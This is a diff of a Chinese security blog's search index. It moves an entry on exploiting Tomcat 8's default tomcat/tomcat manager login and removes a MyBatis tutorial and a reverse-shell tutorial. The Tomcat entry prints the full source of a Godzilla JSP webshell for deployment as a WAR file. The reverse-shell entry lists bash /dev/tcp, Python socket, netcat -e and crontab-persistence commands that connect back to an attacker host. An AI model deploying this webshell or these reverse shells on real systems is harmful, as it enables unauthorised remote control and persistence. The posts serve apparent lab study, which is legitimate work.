class="string">&quot;com.mysql.jdbc.Driver&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;url&quot;</span> <span class="attr">value</span>=<span class="string">&quot;jdbc:mysql://localhost:3306/mybatis?useSSL=true<span class="symbol">&amp;amp;</span>useUnicode=true<span class="symbol">&amp;amp;</span>characterEncoding=UTF-8&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;root&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;root&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">environment</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">environments</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<ul>
-<li>编写mybatis工具类</li>
-</ul>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//工厂模式</span></span><br><span class="line"><span class="comment">// sqlSessionFactory --&gt;sqlSession</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MybatisUtils</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> SqlSessionFactory sqlSessionFactory;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//使用mybatis，第一步获取sqlSessionFactory对象</span></span><br><span class="line">            String resource = <span class="string">&quot;mybatis-config.xml&quot;</span>;</span><br><span class="line">            InputStream inputStream = Resources.getResourceAsStream(resource);</span><br><span class="line">            sqlSessionFactory = <span class="keyword">new</span> SqlSessionFactoryBuilder().build(inputStream);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//既然有了 SqlSessionFactory，顾名思义，我们可以从中获得 SqlSession 的实例</span></span><br><span class="line">    <span class="comment">// SqlSession 提供了在数据库执行 SQL 命令所需的所有方法</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> SqlSession <span class="title">getSqlSession</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> sqlSessionFactory.openSession();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="3-编写代码"><a href="#3-编写代码" class="headerlink" title="3.编写代码"></a>3.编写代码</h3><ul>
-<li>实体类</li>
-</ul>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//实体类</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> uid;</span><br><span class="line">    <span class="keyword">private</span> String uname;</span><br><span class="line">    <span class="keyword">private</span> String upassword;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">User</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">User</span><span class="params">(<span class="keyword">int</span> uid, String uname, String upassword)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.uid = uid;</span><br><span class="line">        <span class="keyword">this</span>.uname = uname;</span><br><span class="line">        <span class="keyword">this</span>.upassword = upassword;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getUid</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> uid;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUid</span><span class="params">(<span class="keyword">int</span> uid)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.uid = uid;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getUname</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> uname;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUname</span><span class="params">(String uname)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.uname = uname;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getUpassword</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> upassword;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUpassword</span><span class="params">(String upassword)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.upassword = upassword;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<ul>
-<li>dao接口</li>
-</ul>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">UserDao</span> </span>&#123;</span><br><span class="line">    <span class="function">List&lt;User&gt; <span class="title">getUserList</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<ul>
-<li>接口实现类</li>
-</ul>
-<p>由原来的UserDaoImpl转变为一个Mapper.xml配置文件</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">mapper</span></span></span><br><span class="line"><span class="meta">        <span class="meta-keyword">PUBLIC</span> <span class="meta-string">&quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;</span></span></span><br><span class="line"><span class="meta">        <span class="meta-string">&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--namespace==绑定一个对应的Dao/Mapper接口--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mapper</span> <span class="attr">namespace</span>=<span class="string">&quot;com.nuc.dao.UserDao&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;getUserList&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;com.nuc.pojo.User&quot;</span>&gt;</span></span><br><span class="line">    select * from mybatis.user</span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mapper</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<h3 id="4-测试"><a href="#4-测试" class="headerlink" title="4.测试"></a>4.测试</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserDaoTest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">//第一步：获得SqlSession对象</span></span><br><span class="line">        SqlSession sqlSession = MybatisUtils.getSqlSession();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//执行sql</span></span><br><span class="line">        <span class="comment">//方式一：getMapper</span></span><br><span class="line">        UserDao userDao = sqlSession.getMapper(UserDao.class);</span><br><span class="line">        List&lt;User&gt; userList = userDao.getUserList();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//方式二：(不推荐使用)</span></span><br><span class="line"><span class="comment">//        List&lt;User&gt; userList1 = sqlSession.selectList(&quot;com.nuc.dao.UserDao.getUserList&quot;);</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (User user : userList) &#123;</span><br><span class="line">            System.out.println(user);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//关闭SqlSession</span></span><br><span class="line">        sqlSession.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-
-<h3 id="踩坑记录"><a href="#踩坑记录" class="headerlink" title="踩坑记录"></a>踩坑记录</h3><ol>
-<li>缺少配置文件<code>MapperRegistry</code></li>
-</ol>
-<p><code>org.apache.ibatis.binding.BindingException: Type interface com.nuc.dao.UserDao is not known to the MapperRegistry.</code></p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--    每一个Mapper.xml都要在mybatis核心配置中注册--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mappers</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">mapper</span> <span class="attr">resource</span>=<span class="string">&quot;com/nuc/dao/UserMapper.xml&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">mappers</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<ol start="2">
-<li>Mapper.xml位置问题</li>
-</ol>
-<p><img src="https://i.loli.net/2021/11/26/TgmAL61Dhy97pBa.png" alt="image-20211126145303021"></p>
-<p>从dao里面移动到resources中</p>
-]]></content>
-      <tags>
-        <tag>mybatis</tag>
       </tags>
   </entry>
   <entry>
@@ -1200,6 +1206,36 @@
       </tags>
   </entry>
   <entry>
+    <title>tomcat8 弱口令</title>
+    <url>/2021/09/09/tomcat8-%E5%BC%B1%E5%8F%A3%E4%BB%A4/</url>
+    <content><![CDATA[<h2 id="tomcat8-弱口令"><a href="#tomcat8-弱口令" class="headerlink" title="tomcat8 弱口令"></a>tomcat8 弱口令</h2><p>正常安装的情况下，tomcat8中默认没有任何用户，且manager页面只允许本地IP访问。只有管理员手工修改了这些属性的情况下，才可以进行攻击</p>
+<p>用户权限在<code>conf/tomcat-users.xml</code>文件中配置</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;tomcat-users xmlns&#x3D;&quot;http:&#x2F;&#x2F;tomcat.apache.org&#x2F;xml&quot;</span><br><span class="line">              xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot;</span><br><span class="line">              xsi:schemaLocation&#x3D;&quot;http:&#x2F;&#x2F;tomcat.apache.org&#x2F;xml tomcat-users.xsd&quot;</span><br><span class="line">              version&#x3D;&quot;1.0&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;role rolename&#x3D;&quot;manager-gui&quot;&#x2F;&gt;</span><br><span class="line">    &lt;role rolename&#x3D;&quot;manager-script&quot;&#x2F;&gt;</span><br><span class="line">    &lt;role rolename&#x3D;&quot;manager-jmx&quot;&#x2F;&gt;</span><br><span class="line">    &lt;role rolename&#x3D;&quot;manager-status&quot;&#x2F;&gt;</span><br><span class="line">    &lt;role rolename&#x3D;&quot;admin-gui&quot;&#x2F;&gt;</span><br><span class="line">    &lt;role rolename&#x3D;&quot;admin-script&quot;&#x2F;&gt;</span><br><span class="line">    &lt;user username&#x3D;&quot;tomcat&quot; password&#x3D;&quot;tomcat&quot; roles&#x3D;&quot;manager-gui,manager-script,manager-jmx,manager-status,admin-gui,admin-script&quot; &#x2F;&gt;</span><br><span class="line">    </span><br><span class="line">&lt;&#x2F;tomcat-users&gt;</span><br></pre></td></tr></table></figure>
+
+
+<p>Tomcat支持在后台部署war文件，可以直接将webshell部署到web目录下。其中，欲访问后台，需要对应用户有相应权限</p>
+<p>docker搭建环境</p>
+<p><img src="https://i.loli.net/2021/09/10/A64IXcg2RTUEzie.png" alt="image-20210910170730975"></p>
+<p>访问<code>xxx:8080/manager/html</code>弱口令tomcat、tomcat登录</p>
+<p><img src="https://i.loli.net/2021/09/10/vzZhNtUiDgGwF1x.png" alt="image-20210910171611943"></p>
+<p>找到上传点</p>
+<p>哥斯拉默认配置生成111.jsp，新建111文件夹，压缩后修改后缀为war</p>
+<blockquote>
+<p>111.jsp</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;%! String xc&#x3D;&quot;3c6e0b8a9c15224a&quot;; String pass&#x3D;&quot;pass&quot;; String md5&#x3D;md5(pass+xc); class X extends ClassLoader&#123;public X(ClassLoader z)&#123;super(z);&#125;public Class Q(byte[] cb)&#123;return super.defineClass(cb, 0, cb.length);&#125; &#125;public byte[] x(byte[] s,boolean m)&#123; try&#123;javax.crypto.Cipher c&#x3D;javax.crypto.Cipher.getInstance(&quot;AES&quot;);c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),&quot;AES&quot;));return c.doFinal(s); &#125;catch (Exception e)&#123;return null; &#125;&#125; public static String md5(String s) &#123;String ret &#x3D; null;try &#123;java.security.MessageDigest m;m &#x3D; java.security.MessageDigest.getInstance(&quot;MD5&quot;);m.update(s.getBytes(), 0, s.length());ret &#x3D; new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();&#125; catch (Exception e) &#123;&#125;return ret; &#125; public static String base64Encode(byte[] bs) throws Exception &#123;Class base64;String value &#x3D; null;try &#123;base64&#x3D;Class.forName(&quot;java.util.Base64&quot;);Object Encoder &#x3D; base64.getMethod(&quot;getEncoder&quot;, null).invoke(base64, null);value &#x3D; (String)Encoder.getClass().getMethod(&quot;encodeToString&quot;, new Class[] &#123; byte[].class &#125;).invoke(Encoder, new Object[] &#123; bs &#125;);&#125; catch (Exception e) &#123;try &#123; base64&#x3D;Class.forName(&quot;sun.misc.BASE64Encoder&quot;); Object Encoder &#x3D; base64.newInstance(); value &#x3D; (String)Encoder.getClass().getMethod(&quot;encode&quot;, new Class[] &#123; byte[].class &#125;).invoke(Encoder, new Object[] &#123; bs &#125;);&#125; catch (Exception e2) &#123;&#125;&#125;return value; &#125; public static byte[] base64Decode(String bs) throws Exception &#123;Class base64;byte[] value &#x3D; null;try &#123;base64&#x3D;Class.forName(&quot;java.util.Base64&quot;);Object decoder &#x3D; base64.getMethod(&quot;getDecoder&quot;, null).invoke(base64, null);value &#x3D; (byte[])decoder.getClass().getMethod(&quot;decode&quot;, new Class[] &#123; String.class &#125;).invoke(decoder, new Object[] &#123; bs &#125;);&#125; catch (Exception e) &#123;try &#123; base64&#x3D;Class.forName(&quot;sun.misc.BASE64Decoder&quot;); Object decoder &#x3D; base64.newInstance(); value &#x3D; (byte[])decoder.getClass().getMethod(&quot;decodeBuffer&quot;, new Class[] &#123; String.class &#125;).invoke(decoder, new Object[] &#123; bs &#125;);&#125; catch (Exception e2) &#123;&#125;&#125;return value; &#125;%&gt;&lt;%try&#123;byte[] data&#x3D;base64Decode(request.getParameter(pass));data&#x3D;x(data, false);if (session.getAttribute(&quot;payload&quot;)&#x3D;&#x3D;null)&#123;session.setAttribute(&quot;payload&quot;,new X(this.getClass().getClassLoader()).Q(data));&#125;else&#123;request.setAttribute(&quot;parameters&quot;,data);java.io.ByteArrayOutputStream arrOut&#x3D;new java.io.ByteArrayOutputStream();Object f&#x3D;((Class)session.getAttribute(&quot;payload&quot;)).newInstance();f.equals(arrOut);f.equals(pageContext);response.getWriter().write(md5.substring(0,16));f.toString();response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));response.getWriter().write(md5.substring(16));&#125; &#125;catch (Exception e)&#123;&#125;%&gt;</span><br></pre></td></tr></table></figure>
+<p>上传111.war，连接</p>
+<p><img src="https://i.loli.net/2021/09/10/m1JPLjuZ8y2A7Oe.png" alt="image-20210910175031855"></p>
+<p><img src="https://i.loli.net/2021/09/10/xYRn934CsoJLW6M.png" alt="image-20210910175133308"></p>
+]]></content>
+      <categories>
+        <category>Tomcat</category>
+      </categories>
+      <tags>
+        <tag>Tomcat</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>tomcat rce cve-2017-12615</title>
     <url>/2021/07/24/tomcat-rce-cve-2017-12615/</url>
     <content><![CDATA[<p>vulhub来复现一下Tomcat CVE-2017-12615</p>
@@ -1256,36 +1292,6 @@
 ]]></content>
       <tags>
         <tag>tomcat</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>tomcat8 弱口令</title>
-    <url>/2021/09/09/tomcat8-%E5%BC%B1%E5%8F%A3%E4%BB%A4/</url>
-    <content><![CDATA[<h2 id="tomcat8-弱口令"><a href="#tomcat8-弱口令" class="headerlink" title="tomcat8 弱口令"></a>tomcat8 弱口令</h2><p>正常安装的情况下，tomcat8中默认没有任何用户，且manager页面只允许本地IP访问。只有管理员手工修改了这些属性的情况下，才可以进行攻击</p>
-<p>用户权限在<code>conf/tomcat-users.xml</code>文件中配置</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;tomcat-users xmlns&#x3D;&quot;http:&#x2F;&#x2F;tomcat.apache.org&#x2F;xml&quot;</span><br><span class="line">              xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot;</span><br><span class="line">              xsi:schemaLocation&#x3D;&quot;http:&#x2F;&#x2F;tomcat.apache.org&#x2F;xml tomcat-users.xsd&quot;</span><br><span class="line">              version&#x3D;&quot;1.0&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;role rolename&#x3D;&quot;manager-gui&quot;&#x2F;&gt;</span><br><span class="line">    &lt;role rolename&#x3D;&quot;manager-script&quot;&#x2F;&gt;</span><br><span class="line">    &lt;role rolename&#x3D;&quot;manager-jmx&quot;&#x2F;&gt;</span><br><span class="line">    &lt;role rolename&#x3D;&quot;manager-status&quot;&#x2F;&gt;</span><br><span class="line">    &lt;role rolename&#x3D;&quot;admin-gui&quot;&#x2F;&gt;</span><br><span class="line">    &lt;role rolename&#x3D;&quot;admin-script&quot;&#x2F;&gt;</span><br><span class="line">    &lt;user username&#x3D;&quot;tomcat&quot; password&#x3D;&quot;tomcat&quot; roles&#x3D;&quot;manager-gui,manager-script,manager-jmx,manager-status,admin-gui,admin-script&quot; &#x2F;&gt;</span><br><span class="line">    </span><br><span class="line">&lt;&#x2F;tomcat-users&gt;</span><br></pre></td></tr></table></figure>
-
-
-<p>Tomcat支持在后台部署war文件，可以直接将webshell部署到web目录下。其中，欲访问后台，需要对应用户有相应权限</p>
-<p>docker搭建环境</p>
-<p><img src="https://i.loli.net/2021/09/10/A64IXcg2RTUEzie.png" alt="image-20210910170730975"></p>
-<p>访问<code>xxx:8080/manager/html</code>弱口令tomcat、tomcat登录</p>
-<p><img src="https://i.loli.net/2021/09/10/vzZhNtUiDgGwF1x.png" alt="image-20210910171611943"></p>
-<p>找到上传点</p>
-<p>哥斯拉默认配置生成111.jsp，新建111文件夹，压缩后修改后缀为war</p>
-<blockquote>
-<p>111.jsp</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;%! String xc&#x3D;&quot;3c6e0b8a9c15224a&quot;; String pass&#x3D;&quot;pass&quot;; String md5&#x3D;md5(pass+xc); class X extends ClassLoader&#123;public X(ClassLoader z)&#123;super(z);&#125;public Class Q(byte[] cb)&#123;return super.defineClass(cb, 0, cb.length);&#125; &#125;public byte[] x(byte[] s,boolean m)&#123; try&#123;javax.crypto.Cipher c&#x3D;javax.crypto.Cipher.getInstance(&quot;AES&quot;);c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),&quot;AES&quot;));return c.doFinal(s); &#125;catch (Exception e)&#123;return null; &#125;&#125; public static String md5(String s) &#123;String ret &#x3D; null;try &#123;java.security.MessageDigest m;m &#x3D; java.security.MessageDigest.getInstance(&quot;MD5&quot;);m.update(s.getBytes(), 0, s.length());ret &#x3D; new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();&#125; catch (Exception e) &#123;&#125;return ret; &#125; public static String base64Encode(byte[] bs) throws Exception &#123;Class base64;String value &#x3D; null;try &#123;base64&#x3D;Class.forName(&quot;java.util.Base64&quot;);Object Encoder &#x3D; base64.getMethod(&quot;getEncoder&quot;, null).invoke(base64, null);value &#x3D; (String)Encoder.getClass().getMethod(&quot;encodeToString&quot;, new Class[] &#123; byte[].class &#125;).invoke(Encoder, new Object[] &#123; bs &#125;);&#125; catch (Exception e) &#123;try &#123; base64&#x3D;Class.forName(&quot;sun.misc.BASE64Encoder&quot;); Object Encoder &#x3D; base64.newInstance(); value &#x3D; (String)Encoder.getClass().getMethod(&quot;encode&quot;, new Class[] &#123; byte[].class &#125;).invoke(Encoder, new Object[] &#123; bs &#125;);&#125; catch (Exception e2) &#123;&#125;&#125;return value; &#125; public static byte[] base64Decode(String bs) throws Exception &#123;Class base64;byte[] value &#x3D; null;try &#123;base64&#x3D;Class.forName(&quot;java.util.Base64&quot;);Object decoder &#x3D; base64.getMethod(&quot;getDecoder&quot;, null).invoke(base64, null);value &#x3D; (byte[])decoder.getClass().getMethod(&quot;decode&quot;, new Class[] &#123; String.class &#125;).invoke(decoder, new Object[] &#123; bs &#125;);&#125; catch (Exception e) &#123;try &#123; base64&#x3D;Class.forName(&quot;sun.misc.BASE64Decoder&quot;); Object decoder &#x3D; base64.newInstance(); value &#x3D; (byte[])decoder.getClass().getMethod(&quot;decodeBuffer&quot;, new Class[] &#123; String.class &#125;).invoke(decoder, new Object[] &#123; bs &#125;);&#125; catch (Exception e2) &#123;&#125;&#125;return value; &#125;%&gt;&lt;%try&#123;byte[] data&#x3D;base64Decode(request.getParameter(pass));data&#x3D;x(data, false);if (session.getAttribute(&quot;payload&quot;)&#x3D;&#x3D;null)&#123;session.setAttribute(&quot;payload&quot;,new X(this.getClass().getClassLoader()).Q(data));&#125;else&#123;request.setAttribute(&quot;parameters&quot;,data);java.io.ByteArrayOutputStream arrOut&#x3D;new java.io.ByteArrayOutputStream();Object f&#x3D;((Class)session.getAttribute(&quot;payload&quot;)).newInstance();f.equals(arrOut);f.equals(pageContext);response.getWriter().write(md5.substring(0,16));f.toString();response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));response.getWriter().write(md5.substring(16));&#125; &#125;catch (Exception e)&#123;&#125;%&gt;</span><br></pre></td></tr></table></figure>
-<p>上传111.war，连接</p>
-<p><img src="https://i.loli.net/2021/09/10/m1JPLjuZ8y2A7Oe.png" alt="image-20210910175031855"></p>
-<p><img src="https://i.loli.net/2021/09/10/xYRn934CsoJLW6M.png" alt="image-20210910175133308"></p>
-]]></content>
-      <categories>
-        <category>Tomcat</category>
-      </categories>
-      <tags>
-        <tag>Tomcat</tag>
       </tags>
   </entry>
   <entry>
@@ -1443,95 +1449,6 @@
 ]]></content>
   </entry>
   <entry>
-    <title>反弹shell学习</title>
-    <url>/2021/06/24/%E5%8F%8D%E5%BC%B9shell%E5%AD%A6%E4%B9%A0/</url>
-    <content><![CDATA[<h1 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h1><h2 id="linux下反弹shell的几种方法"><a href="#linux下反弹shell的几种方法" class="headerlink" title="linux下反弹shell的几种方法"></a>linux下反弹shell的几种方法</h2><p>测试环境说明</p>
-<p>攻击者：kali2020.03 64位 192.168.229.129</p>
-<p>靶机：kali2018 192.168.229.130</p>
-<p><a href="https://www.freebuf.com/articles/system/178150.html">https://www.freebuf.com/articles/system/178150.html</a></p>
-<h3 id="bash-反弹"><a href="#bash-反弹" class="headerlink" title="bash 反弹"></a>bash 反弹</h3><p>反弹shell的命令</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
-<p>开启监听端口</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvp port</span><br></pre></td></tr></table></figure>
-<p>受害机上使用</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
-<p>解释：</p>
-<ul>
-<li>bash -i代表在本地打开一个bash</li>
-<li>/dev/tcp/ip/port， /dev/tcp/是Linux中的一个特殊设备,打开这个文件就相当于发出了一个socket调用，建立一个socket连接</li>
-<li>&amp;后面跟上/dev/tcp/ip/port这个文件代表将标准输出和标准错误输出重定向到这个文件，也就是传递到远程上，如果远程开启了对应的端口去监听，就会接收到这个bash的标准输出和标准错误输出</li>
-<li>加上0&gt;&amp;1，代表将标准输入重定向到标准输出，这里的标准输出已经重定向到了/dev/tcp/ip/port这个文件，也就是远程，那么标准输入也就重定向到了远程，这样的话就可以直接在远程输入了</li>
-</ul>
-<p><img src="https://cdn.nlark.com/yuque/0/2021/png/21562337/1623305370591-81a7de94-5ef7-4df9-afb8-ca230297e390.png" alt="img"></p>
-<h3 id="python-反弹"><a href="#python-反弹" class="headerlink" title="python 反弹"></a>python 反弹</h3><p>反弹shell的命令变为</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -c &quot;import os,socket,subprocess;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;ip&#39;,port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-i&#39;]);&quot;</span><br></pre></td></tr></table></figure>
-
-
-<p><img src="https://cdn.nlark.com/yuque/0/2021/png/21562337/1623305501499-5f0540e6-7b0f-40f4-940a-4082513732f0.png" alt="img"></p>
-<h3 id="nc-反弹"><a href="#nc-反弹" class="headerlink" title="nc 反弹"></a>nc 反弹</h3><p>条件是靶机上有nc</p>
-<p>尝试两种方法后都莫有成功</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvp port</span><br><span class="line"></span><br><span class="line">nc -e &#x2F;bin&#x2F;sh ip port </span><br><span class="line">-e后面跟的参数代表的是在创建连接后执行的程序，这里代表在连接到远程后可以在远程执行一个本地shell(&#x2F;bin&#x2F;bash)，也就是反弹一个shell给远程</span><br></pre></td></tr></table></figure>
-<p><img src="https://cdn.nlark.com/yuque/0/2021/png/21562337/1623307363295-39c15dae-1953-4fa5-9734-4a9cd7b14533.png" alt="img"></p>
-<p><img src="https://cdn.nlark.com/yuque/0/2021/png/21562337/1623307406531-927cfb8d-dfef-47f4-ae92-b22f6432bed7.png" alt="img"></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -nvlp port</span><br><span class="line">nc -nvlp port</span><br><span class="line">nc ip port|&#x2F;bin&#x2F;bash|ip port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">使用nc监听端口反弹shell时可能会有一个警告：</span><br><span class="line">Warning: forward host lookup failed for bogon: Unknown host,</span><br><span class="line">根据nc帮助文档的提示加上-n参数就可以不产生这个警告了</span><br><span class="line">-n参数代表在建立连接之前不对主机进行dns解析</span><br></pre></td></tr></table></figure>
-
-
-<p><img src="https://cdn.nlark.com/yuque/0/2021/png/21562337/1623307323674-b71ca629-7869-4534-ab4e-3feb9986cfd7.png" alt="img"></p>
-<p><img src="https://cdn.nlark.com/yuque/0/2021/png/21562337/1623307242554-99df599d-d6cf-4913-8fde-69cd68b76c2d.png" alt="img"></p>
-<h3 id="定时计划反弹shell"><a href="#定时计划反弹shell" class="headerlink" title="定时计划反弹shell"></a>定时计划反弹shell</h3><ol>
-<li><code>crontab -e</code>直接写入</li>
-</ol>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">* * * * *  bash -i &gt;&amp; /dev/tcp/ip/8888 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
-
-
-<p><img src="https://s2.loli.net/2021/12/07/UqMAvptbo85mygr.png" alt="image-20211207163655912"></p>
-<ol start="2">
-<li>创建shell文件，然后通过<code>crontab -e</code>写入</li>
-</ol>
-<p>ps</p>
-<blockquote>
-<p>在<code>/etc/crontabshell</code>下写入</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/IP/8888  0&gt;&amp;1</span><br></pre></td></tr></table></figure>
-
-<p>然后<code>crontab -e</code>写入</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">* * * * * /etc/crontabshell</span><br></pre></td></tr></table></figure>
-<p><a href="https://www.jianshu.com/p/06f7cda74b84">Linux定时计划反弹shell</a></p>
-</blockquote>
-<h3 id="php-反弹"><a href="#php-反弹" class="headerlink" title="php 反弹"></a>php 反弹</h3><p>注意php反弹shell的这些方法都需要php关闭safe_mode这个选项，才可以使用exec函数  </p>
-<p>默认的php.ini文件中没有打开安全模式</p>
-<p>使用php的exec函数执行反弹shell的命令</p>
